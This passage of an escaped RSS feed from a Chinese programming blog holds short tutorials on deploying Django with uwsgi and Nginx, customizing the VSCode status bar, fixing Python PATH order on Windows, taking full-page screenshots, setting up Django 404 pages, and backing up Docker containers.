&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.core.wsgi &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; get_wsgi_application

os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;environ&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setdefault(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DJANGO_SETTINGS_MODULE&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysite.settings&amp;#34;&lt;/span&gt;)
application &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_wsgi_application()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3django-与-uwsgi&#34;&gt;3.Django 与 uwsgi&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;测试：&lt;code&gt;uwsgi --ini uwsgi.ini&lt;/code&gt;，ini 内容需指定项目目录与 wsgi 文件&lt;/li&gt;
&lt;li&gt;访问宿主机 IP:端口，所有的请求都会经过 uwsgi 然后传递给 Django&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4nginx&#34;&gt;4.Nginx&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Docker 安装：&lt;code&gt;docker pull nginx&lt;/code&gt;，&lt;code&gt;docker run --name some-nginx --privileged=true -v /your-content:/usr/share/nginx/html:ro -d -p 8000:80 nginx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;检查：&lt;code&gt;nginx -v&lt;/code&gt;，&lt;code&gt;/etc/init.d/nginx status&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启动：&lt;code&gt;/etc/init.d/nginx start&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;关闭：&lt;code&gt;/etc/init.d/nginx stop&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;重启：&lt;code&gt;/etc/init.d/nginx restart&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5nginx-与-uwsgi&#34;&gt;5.Nginx 与 uwsgi&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;uwsgi 配置：修改 &lt;code&gt;uwsgi.ini&lt;/code&gt;，启用&lt;code&gt;socket=0.0.0.0:8080&lt;/code&gt;，使用端口通信而不再作为服务器&lt;/li&gt;
&lt;li&gt;修改 Nginx 配置文件：&lt;code&gt;cd /etc/nginx&lt;/code&gt;，可以通过&lt;code&gt;nginx -V&lt;/code&gt;查看，属性&lt;code&gt;--conf-path&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# vim nginx.conf
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.....&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;http&lt;/span&gt;{
    &lt;span style=&#34;color:#f92672&#34;&gt;.......&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# include /etc/nginx/conf.d/*.conf 可能需要前往这以修改 server 块配置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;server&lt;/span&gt;{
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;uwsgi_params&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;# 转交请求给uwsgi，填uwsgi服务地址
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;uwsgi_pass&lt;/span&gt; 127.0.0.1:&lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;重启，能访问网页，但无静态文件&lt;/li&gt;
&lt;li&gt;配置静态文件&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# vim nginx.conf
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.....&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;http&lt;/span&gt;{
    &lt;span style=&#34;color:#f92672&#34;&gt;.......&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# include /etc/nginx/conf.d/*.conf 可能需要前往这以修改 server 块配置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;server&lt;/span&gt;{
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;uwsgi_params&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;# 转交请求给uwsgi，填uwsgi服务地址
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;uwsgi_pass&lt;/span&gt; 127.0.0.1:&lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;;
        }
        
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/static&lt;/span&gt; {
            &lt;span style=&#34;color:#75715e&#34;&gt;# 静态文件路径
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;alias&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/root/static/&lt;/span&gt;;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Django 收集静态文件：&lt;code&gt;python manage.py collectstatic&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 指定收集静态文件的路径&lt;/span&gt;
STATIC_ROOT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(BASE_DIR, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;static/&amp;#34;&lt;/span&gt;)
STATICFILES_FINDERS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (
 
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;django.contrib.staticfiles.finders.FileSystemFinder&amp;#34;&lt;/span&gt;,
 
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;django.contrib.staticfiles.finders.AppDirectoriesFinder&amp;#34;&lt;/span&gt;
 
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6网络拓扑&#34;&gt;6.网络拓扑&lt;/h2&gt;
&lt;p&gt;通过上述配置，当用户访问网页时，请求会先经过Nginx，然后Nginx会判断是否是动态请求&lt;code&gt;/&lt;/code&gt;，若是则将请求转交给 uwsgi ，由 uwsgi 再转交给 Django；若请求是静态请求 &lt;code&gt;/static&lt;/code&gt;，那么 Nginx 将直接从收集的静态文件目录中将资源找到，返回给浏览器。&lt;/p&gt;
&lt;h2 id=&#34;7扩展&#34;&gt;7.扩展&lt;/h2&gt;
&lt;p&gt;当用户访问网页时，有部分 html 文件可以被直接访问，对于这些，可以使用多个 Nginx 服务器分开处理，以节省 uwsgi 的负担。&lt;/p&gt;
&lt;p&gt;第一个nginx服务，用来提交可直接打开的静态页面&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 配置服务提交静态页面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;server&lt;/span&gt; {
        &lt;span style=&#34;color:#f92672&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;;
        &lt;span style=&#34;color:#f92672&#34;&gt;server_name&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;localhost&lt;/span&gt;;
 
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/static&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;alias&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;/home/mayanan/bj18/dailyfresh/static/&lt;/span&gt;;
        }
 
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {
            &lt;span style=&#34;color:#75715e&#34;&gt;#root   html;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;/home/mayanan/bj18/dailyfresh/static/&lt;/span&gt;;
            &lt;span style=&#34;color:#f92672&#34;&gt;index&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;index.html&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;index.htm&lt;/span&gt;;
        }
 
        &lt;span style=&#34;color:#f92672&#34;&gt;error_page&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;502&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;503&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;504&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt;;
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;html&lt;/span&gt;;
        }
 
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二个 nginx 服务，精确匹配&lt;code&gt;/&lt;/code&gt;并转交请求给静态文件服务器 nginx，模糊匹配&lt;code&gt;/&lt;/code&gt;转交请求给 uwsgi，&lt;code&gt;/static&lt;/code&gt;静态文件匹配，从收集的静态文件目录中找到静态文件，直接返回给浏览器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;server&lt;/span&gt; {
        &lt;span style=&#34;color:#f92672&#34;&gt;listen&lt;/span&gt;       &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;;
        &lt;span style=&#34;color:#f92672&#34;&gt;server_name&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;localhost&lt;/span&gt;;
 
        &lt;span style=&#34;color:#75715e&#34;&gt;#charset koi8-r;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 
        &lt;span style=&#34;color:#75715e&#34;&gt;#access_log  logs/host.access.log  main;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 
        &lt;span style=&#34;color:#75715e&#34;&gt;# = 代表精确匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {
                &lt;span style=&#34;color:#75715e&#34;&gt;# 传递请求给静态文件服务器的nginx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;proxy_pass&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;http://192.168.13.128:9999&lt;/span&gt;;
                &lt;span style=&#34;color:#75715e&#34;&gt;#root  /home/mayanan/bj18/dailyfresh/static/;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;#index  index.html index.htm;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        }
 
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {
                &lt;span style=&#34;color:#75715e&#34;&gt;# 包含uwsgi的请求参数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;uwsgi_params&lt;/span&gt;;
                &lt;span style=&#34;color:#75715e&#34;&gt;# 转交请求给uwsgi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;uwsgi_pass&lt;/span&gt; 127.0.0.1:&lt;span style=&#34;color:#ae81ff&#34;&gt;8080&lt;/span&gt;;
        }
 
        &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/static&lt;/span&gt; {
                &lt;span style=&#34;color:#75715e&#34;&gt;# 指定静态文件存放的目录
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;alias&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/home/mayanan/bj18/dailyfresh/static/&lt;/span&gt;;
        }
 
        &lt;span style=&#34;color:#75715e&#34;&gt;#error_page  404              /404.html;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 
        &lt;span style=&#34;color:#75715e&#34;&gt;# redirect server error pages to the static page /50x.html
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;error_page&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;502&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;503&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;504&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt;;
         &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt; {
            &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt;   &lt;span style=&#34;color:#e6db74&#34;&gt;html&lt;/span&gt;;
        }
    
        &lt;span style=&#34;color:#75715e&#34;&gt;# ......
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt; 
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>VSCode—底部状态栏</title>
        <link>https://ac-lm.github.io/posts/ide/vscode%E5%BA%95%E9%83%A8%E7%8A%B6%E6%80%81%E6%A0%8F/</link>
        <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/ide/vscode%E5%BA%95%E9%83%A8%E7%8A%B6%E6%80%81%E6%A0%8F/</guid>
        <description>&lt;h2 id=&#34;1改变颜色&#34;&gt;1.改变颜色&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在设置中搜索&lt;code&gt;workbench.colorCustomizations&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;点击编辑&lt;code&gt;setting.json&lt;/code&gt;进行修改&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;workbench.colorCustomizations&amp;#34;&lt;/span&gt;: {
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;statusBar.background&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#008cff&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;statusBar.noFolderBackground&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#008cff&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;statusBar.debuggingBackground&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#008cff&amp;#34;&lt;/span&gt;,
    },
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Windows—Python 环境变量不生效</title>
        <link>https://ac-lm.github.io/posts/windows10/windowspython-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8D%E7%94%9F%E6%95%88/</link>
        <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/windows10/windowspython-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8D%E7%94%9F%E6%95%88/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/380716375&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 命令窗口不能使用Python &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1问题&#34;&gt;1.问题&lt;/h2&gt;
&lt;p&gt;已在 Window10 上下载配置好 Python，但是在命令行 CMD 中使用 Python 命令时提示&lt;code&gt;Python not found; run without arguments to install from the Microsoft Store&lt;/code&gt;，已确认 Python 的环境变量已配置。&lt;/p&gt;
&lt;h2 id=&#34;2解决&#34;&gt;2.解决&lt;/h2&gt;
&lt;p&gt;环境变量的优先级问题，由于 WindowsApp 的环境路径优先于 Python 的路径，因此当调用 Python 时，会优先询问 WindowsApp。调换两者路径即可解决。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051003225.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051003225.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;调换后&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051003370.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051003370.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—如何在网页截长图</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</link>
        <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E7%BD%91%E9%A1%B5%E6%88%AA%E9%95%BF%E5%9B%BE/</guid>
        <description>&lt;h2 id=&#34;1f12开发者工具&#34;&gt;1.F12开发者工具&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Ctrl+Shift+P&lt;/code&gt;打开命令查找窗口，输入截图或&lt;code&gt;screenshot / Capture full size screenshot&lt;/code&gt;，查找截长图选项&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291741661.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291741661.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291741751.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291741751.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Django—404 文件</title>
        <link>https://ac-lm.github.io/posts/django/django404-%E6%96%87%E4%BB%B6/</link>
        <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django404-%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;django的404&#34;&gt;Django的404&lt;/h2&gt;
&lt;p&gt;Django 能自动的寻找 404 文件，在路径错误时自动跳转，需要注意的是，当 DEBUG = True 时，系统不会调用 404 文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;404页面找不着了x&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;Error:404,页面找不到了&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h2&lt;/span&gt;&amp;gt;{{ request_path }}&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h2&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;hr&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;404页面名字不允许改变，必须为404.html，且必须放到/templates根目录下&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;hr&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;500,400页面也类似&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Docker—备份和恢复</title>
        <link>https://ac-lm.github.io/posts/docker/docker%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D/</link>
        <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/docker%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D/</guid>
        <description>&lt;h2 id=&#34;1docker-容器的导出备份&#34;&gt;1.docker 容器的导出备份&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker export -o 容器导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 容器ID或容器名称
docker export -o &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/newtomcat.tar mytomcat
-----------------------------------------------------
docker export 容器ID或容器名称 &amp;gt; 容器导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
docker export mytomcat &amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/newtomcat.tar 
+++++++++++++++++++++++++++++++++++++++++++++++++++++
注释：
&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;是docker支持的获取当前目录路径的方法，与linux的pwd类似
&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/newtomcat.tar 表示在当前目录下生成一个newtomcat.tar压缩文件
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2docker-容器的导入恢复&#34;&gt;2.docker 容器的导入恢复&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker import 容器导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 新镜像名称&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:版本号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
